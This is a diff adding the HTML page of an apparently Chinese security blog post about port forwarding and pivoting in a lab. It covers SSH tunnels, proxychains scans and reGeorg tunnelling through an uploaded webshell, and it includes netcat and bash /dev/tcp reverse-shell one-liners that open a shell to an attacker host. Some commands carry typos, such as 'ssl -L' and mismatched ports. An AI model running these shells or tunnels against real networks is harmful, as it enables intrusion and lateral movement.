@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="空闲之余,故学习下端口转发的原理和实践以便日后查看。 首先，区分下正向代理和反向代理  A  -B  -C  A对C的请求, B作为代理 ，代替A去访问C，并将结果返回给A, 所以B是 正向代理 , 简单的来说 就类似于访问Google的原理 。  反向代理 ,当 AB之前 有防火墙，, 不允许 A连B，但是允许B连A ，通常出现于内网环境。 首先  开两台实验机：A（172.28.100.51）">
+<meta property="og:type" content="article">
+<meta property="og:title" content="端口转发的学习">
+<meta property="og:url" content="http://yoursite.com/2018/10/17/端口转发的学习/index.html">
+<meta property="og:site_name" content="c1y2m3‘s Blog">
+<meta property="og:description" content="空闲之余,故学习下端口转发的原理和实践以便日后查看。 首先，区分下正向代理和反向代理  A  -B  -C  A对C的请求, B作为代理 ，代替A去访问C，并将结果返回给A, 所以B是 正向代理 , 简单的来说 就类似于访问Google的原理 。  反向代理 ,当 AB之前 有防火墙，, 不允许 A连B，但是允许B连A ，通常出现于内网环境。 首先  开两台实验机：A（172.28.100.51）">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5bc5ea2e50f8dd1574b1cb73">
+<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5bc5edcd2711cd136d9f68e1">
+<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5bc6a5069b521a22ef61ccf8">
+<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5bc69ffb9b521a22ef610f9b">
+<meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5bc6b065db5aa603f192deee">
+<meta property="og:updated_time" content="2018-11-18T16:51:23.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="端口转发的学习">
+<meta name="twitter:description" content="空闲之余,故学习下端口转发的原理和实践以便日后查看。 首先，区分下正向代理和反向代理  A  -B  -C  A对C的请求, B作为代理 ，代替A去访问C，并将结果返回给A, 所以B是 正向代理 , 简单的来说 就类似于访问Google的原理 。  反向代理 ,当 AB之前 有防火墙，, 不允许 A连B，但是允许B连A ，通常出现于内网环境。 首先  开两台实验机：A（172.28.100.51）">
+<meta name="twitter:image" content="https://www.yunzhijia.com/microblog/filesvr/5bc5ea2e50f8dd1574b1cb73">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/c1y2m3.github.io/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/c1y2m3.github.io/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/c1y2m3.github.io/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>端口转发的学习</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/c1y2m3.github.io/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/c1y2m3.github.io/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/c1y2m3.github.io/">Home</a></li>
+         
+          <li><a href="/c1y2m3.github.io/about/">About</a></li>
+         
+          <li><a href="/c1y2m3.github.io/archives/">Writing</a></li>
+         
+          <li><a href="/c1y2m3.github.io/projects_url">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/c1y2m3.github.io/2018/10/18/浅谈跨站脚本绕过和防御/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/c1y2m3.github.io/2018/10/07/关于前期信息收集笔记/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/10/17/端口转发的学习/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/10/17/端口转发的学习/&text=端口转发的学习"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/10/17/端口转发的学习/&title=端口转发的学习"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/10/17/端口转发的学习/&is_video=false&description=端口转发的学习"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=端口转发的学习&body=Check out this article: http://yoursite.com/2018/10/17/端口转发的学习/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/10/17/端口转发的学习/&title=端口转发的学习"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/10/17/端口转发的学习/&title=端口转发的学习"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/10/17/端口转发的学习/&title=端口转发的学习"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/10/17/端口转发的学习/&title=端口转发的学习"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/10/17/端口转发的学习/&name=端口转发的学习&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#ssl-L-1111-172-28-100-155-80-rootk-172-28-100-188"><span class="toc-number">1.</span> <span class="toc-text">ssl -L 1111:172.28.100.155:80 rootk@172.28.100.188</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        端口转发的学习
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+        <span itemprop="name">c1y2m3‘s Blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2018-10-16T16:34:14.000Z" itemprop="datePublished">2018-10-17</time>
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>空闲之余,故学习下端口转发的原理和实践以便日后查看。</p>
+<p>首先，区分下正向代理和反向代理 </p>
+<p><strong>A  -B  -C </strong></p>
+<p>A对C的请求, B作为代理 ，代替A去访问C，并将结果返回给A, 所以B是 正向代理 , 简单的来说 就类似于访问Google的原理 。 </p>
+<p>反向代理 ,当 AB之前 有防火墙，, 不允许 A连B，但是允许B连A ，通常出现于内网环境。</p>
+<p>首先 </p>
+<p>开两台实验机：<br>A（172.28.100.51） Kali 具有攻击环境<br>B (172.28.100.188) 用来代理的服务端<br>C (172.28.100.155)   web内网主机 </p>
+<p>#####利用SSH隧道,B作为正向代理， 做动态端口转发</p>
+<p>在A上面运行：</p>
+<p>#####<code>ssh -2 -D 2333 rootk@172.28.100.188</code><br>这条命令是将A本地的2333端口，与B的22端口建立Socks连接。</p>
+<p>如果需要访问C的80端口，  浏览器需要侦听127.0.0.1：2333 socks代理 </p>
+<p>直接在A扫描C的端口 ，调用proxychains 侦听 127.0.0.1 2333</p>
+<p>#####<code>vim /etc/proxychains.conf</code></p>
+<p>!!<img src="https://www.yunzhijia.com/microblog/filesvr/5bc5ea2e50f8dd1574b1cb73" alt=""></p>
+<p>#####<code>proxychains nmap -Pn -sT 172.28.100.155</code></p>
+<p>#####利用ssh隧道，B作为正向代理，进行单一的端口转发 </p>
+<h5 id="ssl-L-1111-172-28-100-155-80-rootk-172-28-100-188"><a href="#ssl-L-1111-172-28-100-155-80-rootk-172-28-100-188" class="headerlink" title="ssl -L 1111:172.28.100.155:80 rootk@172.28.100.188"></a><code>ssl -L 1111:172.28.100.155:80 rootk@172.28.100.188</code></h5><p>同理，需要设置socks代理 ， 127.0.0.1 1111</p>
+<p>A访问127.0.0.1:1111 相当于访问C的 80端口 </p>
+<p>!!!<img src="https://www.yunzhijia.com/microblog/filesvr/5bc5edcd2711cd136d9f68e1" alt=""></p>
+<p>#####<code>ssl -L 2222:172.28.100.155:22 rootk@172.28.100.188</code></p>
+<p>A访问 127.0.0.1:2222 相当与访问172.28.100.155:22 (C) 中间需要<a href="mailto:rootk@172.28.100.188" target="_blank" rel="noopener">rootk@172.28.100.188</a> (B)来转发。</p>
+<p>#####利用ssh隧道，B做反向代理，做单一的端口转发<br>A访问127.0.0.1:8888 相当于访问C的80端口</p>
+<p>#####<code>ssh-keygen -t rsa -f /etc/ssh/ssh_host_rsa_key</code></p>
+<p>#####<code>ssh-keygen -t dsa -f /etc/ssh/ssh_host_dsa_key</code></p>
+<p>实验中常出现密钥写入的问题 ，很鸡肋。</p>
+<p>在B上运行： 172.28.100.188</p>
+<p>#####<code>ssh -R 7777:172.28.100.155:80 root@172.28.100.51</code></p>
+<p>B主动去ssh连接，将来自(A)172.28.100.51:8888 的 请求转化成（C）172.28.100.155:80的请求，然后将结果通过ssh隧道，返回给A</p>
+<p>!!!<img src="https://www.yunzhijia.com/microblog/filesvr/5bc6a5069b521a22ef61ccf8" alt=""></p>
+<p>##reGeorg</p>
+<p>Git项目地址：<a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener">https://github.com/sensepost/reGeorg</a> </p>
+<p><code>reGeorg利用webshell建立一个socks代理进行内网穿透，服务器必须支持aspx、php、jsp、js等web语言。</code></p>
+<p>连接172.28.100.188的webshell，上传tunnel.php和 tunnel.nosocket.php 到web目录 </p>
+<p>在 A(Kali）上面去运行 </p>
+<p><code>python reGeorgSocksProxy.py -p 9999 -u http://172.28.100.188/tunnel.nosocket.php</code></p>
+<p>此时会利用172.28.100.188的web服务，与本机的9999端口建立socks代理，就可以用A去打C了。 </p>
+<p>!!<img src="https://www.yunzhijia.com/microblog/filesvr/5bc69ffb9b521a22ef610f9b" alt=""></p>
+<p>#####Windows下 的端口转发 </p>
+<p>#####nc反弹</p>
+<p>正向连接</p>
+<p>在内网执行</p>
+<p>#####<code>nc -l -p 5555 -t -e cmd.exe</code><br>-t是通过telne模式执行 cmd.exe 程序，可以省略。</p>
+<p>在公网执行:</p>
+<p>#####<code>nc -nvv 192.168.8.135 5555</code></p>
+<p>反向连接：</p>
+<p>公网：</p>
+<p>#####<code>nc -lp 5555</code></p>
+<p>在内网机器反弹 #<code>nc -t -e cmd 192.168.8.135 5555</code></p>
+<p>####Linux下的使用：</p>
+<p>攻击机:nc -vlp 9999</p>
+<p>目标机:bash -i &gt;&amp; /dev/tcp/192.168.8.145/9999 0&gt;&amp;1</p>
+<p>#####lcx转发：</p>
+<p>内网：172.28.100.89  开有3389的机器<br>公网:172.28.100.58</p>
+<p>由于是本地实验，故拿内网环境充当公网ip，所以正常的情况下，内网可以正常访问公网，而公网环境不能访问内网。</p>
+<p>内网上执行:lcx.exe -slave 公网IP+端口 内网IP+端口</p>
+<p>#####<code>lcx.exe –slave 172.28.100.58 4444 172.28.100.89 3389</code></p>
+<p>将内网的3389转发到公网的4444端口 。</p>
+<p>公网上执行 <code>lcx.exe -listen 4444 5555</code></p>
+<p>此时内网已把 3389端口转发到公网的5555端口，可以通过127.0.0.1:5555 去连接远程客户端 。</p>
+<p>!!<img src="https://www.yunzhijia.com/microblog/filesvr/5bc6b065db5aa603f192deee" alt=""></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/c1y2m3.github.io/">Home</a></li>
+         
+          <li><a href="/c1y2m3.github.io/about/">About</a></li>
+         
+          <li><a href="/c1y2m3.github.io/archives/">Writing</a></li>
+         
+          <li><a href="/c1y2m3.github.io/projects_url">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#ssl-L-1111-172-28-100-155-80-rootk-172-28-100-188"><span class="toc-number">1.</span> <span class="toc-text">ssl -L 1111:172.28.100.155:80 rootk@172.28.100.188</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/10/17/端口转发的学习/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/10/17/端口转发的学习/&text=端口转发的学习"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/10/17/端口转发的学习/&title=端口转发的学习"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/10/17/端口转发的学习/&is_video=false&description=端口转发的学习"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=端口转发的学习&body=Check out this article: http://yoursite.com/2018/10/17/端口转发的学习/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/10/17/端口转发的学习/&title=端口转发的学习"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/10/17/端口转发的学习/&title=端口转发的学习"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/10/17/端口转发的学习/&title=端口转发的学习"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/10/17/端口转发的学习/&title=端口转发的学习"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/10/17/端口转发的学习/&name=端口转发的学习&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2018 John Doe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/c1y2m3.github.io/">Home</a></li>
+         
+          <li><a href="/c1y2m3.github.io/about/">About</a></li>
+         
+          <li><a href="/c1y2m3.github.io/archives/">Writing</a></li>
+         
+          <li><a href="/c1y2m3.github.io/projects_url">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/c1y2m3.github.io/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/c1y2m3.github.io/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/c1y2m3.github.io/lib/jquery/jquery.min.js"></script>
+<script src="/c1y2m3.github.io/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/c1y2m3.github.io/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
